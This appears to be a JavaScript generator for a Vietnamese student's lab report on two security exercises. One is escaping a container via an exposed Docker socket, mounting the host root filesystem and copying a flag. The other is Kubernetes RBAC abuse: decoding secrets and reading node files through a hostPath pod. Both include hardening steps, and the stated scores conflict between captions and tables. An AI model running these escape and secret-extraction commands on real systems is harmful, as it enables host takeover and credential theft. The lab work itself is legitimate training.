// Bao cao tuan 5: Lab 9 (dso-docker-escape) + Lab 10 (cloud-k8s-rbac)
const path = require('path');
const { render, makeC } = require('./engine');
const { C, h1, h2, h3, p, b, code, img, table } = makeC();

const VM = '192.168.17.144';
const NAM = 'Lê Thành Nam - B22DCAT202';
const EMAIL = 'namlt.b22at202@stu.ptit.edu.vn';

h1('TỔNG QUAN NỘI DUNG TUẦN 5');
h2('Mục tiêu');
p('Trong tuần 5, nhóm thực hiện hai bài thực hành cuối theo lộ trình trên môi trường Labtainer, đóng vai trò sinh viên làm bài từ đầu đến cuối: khởi động bài lab, lần lượt chạy đúng từng dòng lệnh trong hướng dẫn, lấy flag và chấm điểm tự động bằng `checkwork`. Toàn bộ quá trình được chụp ảnh màn hình làm minh chứng.');
h2('Phân công thực hiện');
table(['STT', 'Bài thực hành', 'Mã lab', 'Người thực hiện'], [700, 3700, 2000, 3068], [
  ['9', 'Thoát container qua Docker socket bị lộ', 'dso-docker-escape', NAM],
  ['10', 'Leo thang đặc quyền Kubernetes (RBAC)', 'cloud-k8s-rbac', NAM],
]);
h2('Môi trường thực hiện');
b('Máy ảo Labtainer (VMware): Ubuntu, Docker; các bài lab chạy trong các container cô lập, offline khi làm bài.',
  `Truy cập giao diện đồ họa của máy ảo trực tiếp trên trình duyệt web qua noVNC (cổng 6080, \`http://${VM}:6080/vnc.html\`).`,
  'Mỗi sinh viên khởi động lab bằng email riêng; Labtainer dùng email này để sinh flag/khóa cá thể hóa (HASH_REPLACE).');

// ---------------- LAB 9 ----------------
h1('BÀI THỰC HÀNH 9: THOÁT CONTAINER QUA DOCKER SOCKET (DSO-DOCKER-ESCAPE)');
p('Người thực hiện: ' + NAM + ' (email khởi động lab: ' + EMAIL + ').');
h2('Mục đích');
b('Hiểu rủi ro khi mount `/var/run/docker.sock` vào container: tương đương quyền root trên host (MITRE T1611 - Escape to Host).',
  'Trinh sát dấu hiệu cấu hình sai (docker.sock lộ, capability dư thừa, block device) rồi lợi dụng socket điều khiển Docker daemon host tạo container mount toàn bộ rootfs host.',
  'Đọc flag trên host qua container thoát; sau đó hardening cấu hình chạy container theo CIS Docker Benchmark.');
h2('Môi trường bài lab');
b('Container `app` (có terminal): container ứng dụng bị cấu hình sai - mount `/var/run/docker.sock`; cài sẵn `docker` client.',
  'Container `host-sim` (không có terminal): mô phỏng host chạy Docker daemon (Docker-in-Docker), chứa flag tại `/root/flag.txt` và canary `/root/.hostmarker`.',
  'Trên daemon host-sim có sẵn image tối giản `escimg` để tạo container thoát (offline).');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
code('labtainer -r dso-docker-escape');
img('l9_01_start.jpg', 'Khởi động bài lab dso-docker-escape và mở terminal container app');
h3('Nhiệm vụ 1 - Trinh sát container');
code('cat /proc/1/cgroup\ngrep -i cap /proc/self/status\nls -la /var/run/docker.sock');
img('l9_02_recon.jpg', 'Trinh sát: phát hiện /var/run/docker.sock bị lộ (dấu hiệu cấu hình sai)');
h3('Nhiệm vụ 2 - Thoát container qua Docker socket');
p('Dùng socket lộ để ra lệnh cho Docker daemon host tạo container mới mount toàn bộ rootfs host (`/` → `/host`), rồi trích canary và flag bằng `docker cp`:');
code('docker -H unix:///var/run/docker.sock images\ndocker -H unix:///var/run/docker.sock run -d --name esc -v /:/host escimg sleep 3600\ndocker -H unix:///var/run/docker.sock cp esc:/host/root/.hostmarker ~/host_evidence.txt\ndocker -H unix:///var/run/docker.sock cp esc:/host/root/flag.txt ~/flag_result.txt');
img('l9_03_escape.jpg', 'Thoát container qua socket, đọc canary bf06603e0be2471146c3 và flag 1d5cd1864f434e4a');
h3('Nhiệm vụ 3 - Hardening cấu hình container');
p('Viết lại lệnh chạy container an toàn (bỏ mount socket, bỏ privileged, cap-drop ALL, no-new-privileges, user không phải root, read-only) và lập bảng đối chiếu với CIS Docker Benchmark:');
code('# ~/hardened_run.sh (khong mount docker.sock, khong --privileged)\ndocker run -d --name app \\\n  --cap-drop=ALL --security-opt=no-new-privileges \\\n  --user 1000 --read-only --pids-limit 100 escimg');
img('l9_04_harden.jpg', 'hardened_run.sh: cap-drop=ALL, không mount docker.sock; bảng ánh xạ CIS');
h2('Kết quả thực hiện');
img('l9_05_checkwork.jpg', 'Kết quả chấm điểm tự động bài dso-docker-escape: 6/6 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['recon_container', 'Trinh sát container tìm cấu hình sai', 'Y'],
  ['escape_via_socket', 'Thoát qua Docker socket bị lộ', 'Y'],
  ['escape_via_privileged', 'Đường thoát thay thế (tùy chọn)', 'Y'],
  ['get_flag', 'Đọc flag trên host', 'Y'],
  ['harden_container', 'Hardening cấu hình container', 'Y'],
]);
p('Kết quả: hoàn thành 5/5 mục tiêu; canary host `bf06603e0be2471146c3`, flag `1d5cd1864f434e4a`.');

// ---------------- LAB 10 ----------------
h1('BÀI THỰC HÀNH 10: LEO THANG ĐẶC QUYỀN KUBERNETES RBAC (CLOUD-K8S-RBAC)');
p('Người thực hiện: ' + NAM + ' (email khởi động lab: ' + EMAIL + ').');
h2('Mục đích');
b('Hiểu RBAC Kubernetes: ServiceAccount token, quyền (verbs/resources), và rủi ro khi cấp quyền quá rộng.',
  'Trinh sát quyền của ServiceAccount bị chiếm, moi secret và phát hiện secret để lẫn trong ConfigMap (anti-pattern); dùng quyền tạo pod để thoát ra node qua hostPath.',
  'Khắc phục theo least privilege: thay role quá rộng bằng role tối thiểu và bật Pod Security Standards (restricted).');
h2('Môi trường bài lab');
b('Container `attacker` (có terminal): có `kubectl` và kubeconfig của ServiceAccount bị chiếm (quyền quá rộng: list secrets, create pods) cùng kubeconfig admin cấp sẵn cho hardening.',
  'Container `k8s-node` (không có terminal): một node Kubernetes thật (k3s v1.29.6+k3s2) chạy bằng systemd; namespace `app` chứa secret `db-credentials`, ConfigMap `app-config` (lẫn secret), và flag trên host tại `/opt/host-secrets/flag.txt`.',
  'Lưu ý môi trường: node k3s dùng systemd-in-container nên cần giới hạn inotify đủ lớn (`fs.inotify.max_user_instances`); đã đặt cố định trên máy ảo để node khởi tạo ổn định.');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
code('labtainer -r cloud-k8s-rbac');
img('l10_01_start.jpg', 'Khởi động bài lab cloud-k8s-rbac (node k3s Ready) và mở terminal container attacker');
h3('Nhiệm vụ 1 & 2 - Trinh sát RBAC và moi secret');
code('kubectl auth can-i list secrets -n app\nkubectl auth can-i create pods -n app\nkubectl get secret db-credentials -n app -o jsonpath=\'{.data.password}\' | base64 -d\nkubectl get configmap app-config -n app -o yaml | grep -iE \'legacy_api_key|secret\'');
img('l10_02_loot.jpg', 'ServiceAccount có quyền list secrets/create pods; moi được password và legacy_api_key lẫn trong ConfigMap');
h3('Nhiệm vụ 3 - Thoát ra node qua hostPath pod');
p('Dùng quyền tạo pod để triển khai pod mount `/` của node qua hostPath, rồi đọc flag trên host:');
code('kubectl apply -f /tmp/escape.yaml   # pod maintenance-shell mount hostPath / -> /host\nkubectl wait --for=condition=Ready pod/maintenance-shell -n app --timeout=120s\nkubectl exec maintenance-shell -n app -- cat /host/opt/host-secrets/flag.txt | tee ~/flag.txt');
img('l10_03_escape.jpg', 'Pod hostPath thoát ra node, đọc flag host e200a6d4d36d0165');
h3('Nhiệm vụ 4 - Khắc phục theo least privilege');
p('Dùng kubeconfig admin thay role quá rộng bằng role tối thiểu (chỉ `get` ConfigMap app-config) và bật Pod Security Standards mức restricted; kiểm chứng ServiceAccount không còn quyền:');
code('export KUBECONFIG=~/.kube/admin-config\nkubectl apply -f /tmp/least-priv-role.yaml\nkubectl label ns app pod-security.kubernetes.io/enforce=restricted --overwrite\nexport KUBECONFIG=~/.kube/config\nkubectl auth can-i list secrets -n app   # ky vong: no');
img('l10_04_harden.jpg', 'Sau hardening: ServiceAccount không còn quyền list secrets / create pods (no)');
h2('Kết quả thực hiện');
img('l10_05_checkwork.jpg', 'Kết quả chấm điểm tự động bài cloud-k8s-rbac: 5/5 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['recon_rbac', 'Trinh sát quyền RBAC của ServiceAccount', 'Y'],
  ['loot_secrets', 'Moi secret & secret trong ConfigMap', 'Y'],
  ['escape_node', 'Thoát ra node qua hostPath pod', 'Y'],
  ['harden_cluster', 'Least privilege + Pod Security', 'Y'],
]);
p('Kết quả: hoàn thành 4/4 mục tiêu; flag `e200a6d4d36d0165`.');

// ---------------- KET LUAN ----------------
h1('KẾT LUẬN');
h2('Kết quả đạt được');
b('Hoàn thành bài 9 (dso-docker-escape): checkwork 5/5; thoát container qua Docker socket bị lộ, đọc flag trên host và hardening theo CIS Docker Benchmark.',
  'Hoàn thành bài 10 (cloud-k8s-rbac): checkwork 4/4; leo thang đặc quyền trên node k3s thật, moi secret, thoát ra node qua hostPath, và khắc phục theo least privilege + Pod Security.',
  'Cả hai bài đều được thực hiện bằng cách sao chép đúng từng dòng lệnh trong hướng dẫn, xác nhận hướng dẫn chạy đúng và bài lab thực sự làm được.');
h2('Tổng kết toàn bộ 10 bài lab');
p('Qua 5 tuần, nhóm đã hoàn thành đủ 10 bài thực hành DevSecOps/Cloud Security trên Labtainer (checkwork đạt toàn bộ mục tiêu ở mỗi bài), bao quát: bảo mật IaC, bảo mật Docker image, secret trong Git, chuỗi cung ứng (SBOM/SCA), object storage, WAF, SSRF/IMDS, CI/CD, docker escape và Kubernetes RBAC.');

render(C, {
  imgDir: path.join(__dirname, 'anh5'),
  out: path.join(__dirname, '..', 'bao-cao-tuan-5', 'Bao-cao-tuan-5.docx'),
}).catch(e => { console.error(e); process.exit(1); });
